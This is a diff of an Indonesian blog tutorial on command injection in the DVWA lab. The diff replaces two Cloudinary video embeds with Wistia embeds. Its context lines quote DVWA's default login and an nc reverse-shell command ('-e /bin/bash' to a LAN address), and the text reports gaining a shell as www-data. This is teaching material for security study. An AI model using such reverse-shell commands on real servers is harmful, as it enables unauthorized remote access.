@@ -11,15 +11,7 @@ Sesuai dengan namanya, ***Command Injection*** adalah kerentanan pada aplikasi w
 
 Untuk membuktikan, kita mula-mula akan melihat demonstrasinya command injection terlebih dahulu melalui DVWA yang sudah kita *install* dan *set up* di artikel sebelumnya. Setelah login ke DVWA dengan credensial default, <mark> **admin:password**</mark>, pergi ke menu **Command Injection**. Di sana, ada *form* **`ping`** dan kita bisa meng-*input*-kan *ip address* untuk di-**`ping`**. Kita bisa coba dengan memasukkan *ip address* komputer kita dan nanti *output* **`ping`**-nya akan tampil di bawah *form* tersebut.
 
-<iframe
-  src="https://player.cloudinary.com/embed/?cloud_name=dpvtbnqf7&public_id=commandinjection1_pzgzqw"
-  width="640"
-  height="360" 
-  style="height: auto; width: 100%; aspect-ratio: 640 / 360;"
-  allow="autoplay; fullscreen; encrypted-media; picture-in-picture"
-  allowfullscreen
-  frameborder="0"
-></iframe>
+<script src="https://fast.wistia.com/player.js" async></script><script src="https://fast.wistia.com/embed/wupjiv97zl.js" async type="module"></script><style>wistia-player[media-id='wupjiv97zl']:not(:defined) { background: center / contain no-repeat url('https://fast.wistia.com/embed/medias/wupjiv97zl/swatch'); display: block; filter: blur(5px); padding-top:66.67%; }</style> <wistia-player media-id="wupjiv97zl" seo="false" aspect="1.5"></wistia-player>
 
 Sekarang, kita akan lihat *source code* yang ada di belakangnya, berikut:
 
@@ -116,15 +108,7 @@ nc 192.168.0.109 1234 -e /bin/bash
 > 
 > Untuk info lebih lanjut, bisa baca-baca di **`man nc`**.
 
-<iframe
-  src="https://player.cloudinary.com/embed/?cloud_name=dpvtbnqf7&public_id=commandinjection2_oxdvlq"
-  width="640"
-  height="360" 
-  style="height: auto; width: 100%; aspect-ratio: 640 / 360;"
-  allow="autoplay; fullscreen; encrypted-media; picture-in-picture"
-  allowfullscreen
-  frameborder="0"
-></iframe>
+<script src="https://fast.wistia.com/player.js" async></script><script src="https://fast.wistia.com/embed/r2kuae8tla.js" async type="module"></script><style>wistia-player[media-id='r2kuae8tla']:not(:defined) { background: center / contain no-repeat url('https://fast.wistia.com/embed/medias/r2kuae8tla/swatch'); display: block; filter: blur(5px); padding-top:66.67%; }</style> <wistia-player media-id="r2kuae8tla" seo="false" aspect="1.5"></wistia-player>
 
 Dan kita berhasil mendapatkan *shell* server-nya sebagai user **www-data**.
 
